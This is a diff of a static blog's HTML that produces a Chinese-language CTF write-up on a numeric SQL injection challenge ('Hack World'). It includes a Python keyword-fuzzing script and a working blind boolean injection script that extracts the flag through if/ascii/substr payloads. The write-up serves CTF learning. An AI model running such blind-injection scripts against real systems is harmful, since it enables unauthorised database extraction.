@@ -23,30 +23,35 @@
     var NexT = window.NexT || {};
     var CONFIG = {"hostname":"123-prog.github.io","root":"/","images":"/images","scheme":"Gemini","version":"8.2.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}};
   </script>
-<meta name="description" content="2571374157@qq.com">
-<meta property="og:type" content="website">
-<meta property="og:title" content="GY&#39;s Blog">
-<meta property="og:url" content="https://123-prog.github.io/index.html">
+<meta name="description" content="1.判断注入类型post注入，id&#x3D;1或id&#x3D;2时回显正常，id&#x3D;1’回显bool(false), id&#x3D;1&#x2F;1回显正常，则是数值型注入 2.fuzz一下看看过滤12345678910111213141516import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;4bfe4b6f-e955-4745-98ab-4d80d69579e5.node3.buuoj.cn&#x2F;index.php&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CISCN2019 华北赛区 Day2 Web1 Hack World">
+<meta property="og:url" content="https://123-prog.github.io/2021/01/16/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/index.html">
 <meta property="og:site_name" content="GY&#39;s Blog">
-<meta property="og:description" content="2571374157@qq.com">
+<meta property="og:description" content="1.判断注入类型post注入，id&#x3D;1或id&#x3D;2时回显正常，id&#x3D;1’回显bool(false), id&#x3D;1&#x2F;1回显正常，则是数值型注入 2.fuzz一下看看过滤12345678910111213141516import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;4bfe4b6f-e955-4745-98ab-4d80d69579e5.node3.buuoj.cn&#x2F;index.php&amp;">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://123-prog.github.io/2021/01/16/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/Snipaste_2021-01-16_23-44-12.png">
+<meta property="article:published_time" content="2021-01-16T15:36:45.000Z">
+<meta property="article:modified_time" content="2021-01-16T16:00:48.525Z">
 <meta property="article:author" content="Guangyue">
+<meta property="article:tag" content="sql注入，盲注">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://123-prog.github.io/2021/01/16/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/Snipaste_2021-01-16_23-44-12.png">
 
 
-<link rel="canonical" href="https://123-prog.github.io/">
+<link rel="canonical" href="https://123-prog.github.io/2021/01/16/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/">
 
 
 <script class="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'en'
   };
 </script>
-<title>GY's Blog</title>
+<title>CISCN2019 华北赛区 Day2 Web1 Hack World | GY's Blog</title>
   
 
 
@@ -141,7 +146,7 @@
 
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           Table of Contents
@@ -154,6 +159,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.</span> <span class="nav-text">1.判断注入类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-fuzz%E4%B8%80%E4%B8%8B%E7%9C%8B%E7%9C%8B%E8%BF%87%E6%BB%A4"><span class="nav-number">2.</span> <span class="nav-text">2.fuzz一下看看过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F-%E7%9B%B2%E6%B3%A8"><span class="nav-number">3.</span> <span class="nav-text">3.判断注入方式(盲注)</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -202,9 +208,10 @@
 </noscript>
 
 
-    <div class="main-inner index posts-expand">
+    <div class="main-inner post posts-expand">
 
-    
+
+  
 
 
 <div class="post-block">
@@ -224,9 +231,9 @@
       <meta itemprop="name" content="GY's Blog">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/01/16/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/" class="post-title-link" itemprop="url">CISCN2019 华北赛区 Day2 Web1 Hack World</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          CISCN2019 华北赛区 Day2 Web1 Hack World
+        </h1>
 
         <div class="post-meta-container">
           <div class="post-meta">
@@ -256,7 +263,7 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h3 id="1-判断注入类型"><a href="#1-判断注入类型" class="headerlink" title="1.判断注入类型"></a>1.判断注入类型</h3><p>post注入，id=1或id=2时回显正常，id=1’回显bool(false), id=1/1回显正常，则是数值型注入</p>
+        <h3 id="1-判断注入类型"><a href="#1-判断注入类型" class="headerlink" title="1.判断注入类型"></a>1.判断注入类型</h3><p>post注入，id=1或id=2时回显正常，id=1’回显bool(false), id=1/1回显正常，则是数值型注入</p>
 <h3 id="2-fuzz一下看看过滤"><a href="#2-fuzz一下看看过滤" class="headerlink" title="2.fuzz一下看看过滤"></a>2.fuzz一下看看过滤</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4bfe4b6f-e955-4745-98ab-4d80d69579e5.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./sql.txt&quot;</span>)</span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>:<span class="string">&quot;1&quot;</span>+line</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;SQL Injection Checked.&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(line)</span><br><span class="line">        <span class="built_in">list</span>.append(line)</span><br><span class="line">print(<span class="built_in">list</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#39;AND&#39;, &#39;AUTHORIZATION&#39;, &#39;CORR&#39;, &#39;CORRESPONDING&#39;, &#39;CURRENT_DEFAULT_TRANSFORM_GROUP&#39;, &#39;CURRENT_TRANSFORM_GROUP_FOR_TYPE&#39;, &#39;CURSOR&#39;, &#39;DELETE&#39;, &#39;END-EXEC&#39;, &#39;FLOOR&#39;, &#39;FOR&#39;, &#39;FOREIGN&#39;, &#39;GROUP&#39;, &#39;GROUPING&#39;, &#39;GROUPS&#39;, &#39;IMPORT&#39;, &#39;INDICATOR&#39;, &#39;INSERT&#39;, &#39;INTO&#39;, &#39;LIMIT&#39;, &#39;NORMALIZE&#39;, &#39;OR&#39;, &#39;ORDER&#39;, &#39;PORTION&#39;, &#39;UNION&#39;, &#39;UPDATE&#39;, &#39;XMLFOREST&#39;]</span><br></pre></td></tr></table></figure>
 <h3 id="3-判断注入方式-盲注"><a href="#3-判断注入方式-盲注" class="headerlink" title="3.判断注入方式(盲注)"></a>3.判断注入方式(盲注)</h3><p>union被过滤，联合查询不行，绕过有点困难，报错注入也有点困难，盲注and ,or 等被过滤，if没被过滤，select也可以用，题目告知了我们表名和字段名，所以可以用if进行盲注，因为是数值型注入，所以if条件句直接作为参数传入，就不用and和or了，网上也看到有大佬用异或^来代替or进行盲注，如0^if(…….),下面以if为例子</p>
@@ -265,7 +272,6 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://4bfe4b6f-e955-4745-98ab-4d80d69579e5.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,0)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">300</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        p = payload.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>:p</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j)</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure>
 <p><img src="/2021/01/16/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/Snipaste_2021-01-16_23-44-12.png"></p>
 
-      
     </div>
 
     
@@ -273,222 +279,25 @@
     
 
     <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
+          <div class="post-tags">
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5%EF%BC%8C%E7%9B%B2%E6%B3%A8/" rel="tag"># sql注入，盲注</a>
+          </div>
 
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://123-prog.github.io/2021/01/15/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar2.gif">
-      <meta itemprop="name" content="Guangyue">
-      <meta itemprop="description" content="2571374157@qq.com">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="GY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/01/15/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL/" class="post-title-link" itemprop="url">极客大挑战 2019 BabySQL</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2021-01-15 22:48:25 / Modified: 23:35:33" itemprop="dateCreated datePublished" datetime="2021-01-15T22:48:25+08:00">2021-01-15</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="1-寻找注入点"><a href="#1-寻找注入点" class="headerlink" title="1.寻找注入点"></a>1.寻找注入点</h3><p>get型注入，在password处可进行注入，并且可以判断闭合类型为单引号闭合</p>
-<p><img src="/2021/01/15/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL/Snipaste_2021-01-15_23-04-10.png"></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/01/15/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
         
-      
-    </div>
 
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://123-prog.github.io/2021/01/14/HCTF-2018-Warmup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar2.gif">
-      <meta itemprop="name" content="Guangyue">
-      <meta itemprop="description" content="2571374157@qq.com">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="GY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/01/14/HCTF-2018-Warmup/" class="post-title-link" itemprop="url">HCTF 2018 Warmup</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2021-01-14 18:31:03 / Modified: 19:16:49" itemprop="dateCreated datePublished" datetime="2021-01-14T18:31:03+08:00">2021-01-14</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>简单的代码审计题目，主要需要注意几个点</p>
-<p>源码如下</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/01/14/HCTF-2018-Warmup/#more" rel="contents">
-                Read more &raquo;
-              </a>
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/01/15/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL/" rel="prev" title="极客大挑战 2019 BabySQL">
+                  <i class="fa fa-chevron-left"></i> 极客大挑战 2019 BabySQL
+                </a>
             </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
+            <div class="post-nav-item">
+            </div>
+          </div>
     </footer>
   </article>
 </div>
 
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://123-prog.github.io/2021/01/14/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar2.gif">
-      <meta itemprop="name" content="Guangyue">
-      <meta itemprop="description" content="2571374157@qq.com">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="GY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/01/14/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" class="post-title-link" itemprop="url">学习web之路，任重道远，加油</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2021-01-14 11:51:00 / Modified: 19:24:05" itemprop="dateCreated datePublished" datetime="2021-01-14T11:51:00+08:00">2021-01-14</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p><img src="/2021/01/14/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/698788.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
 
 
 
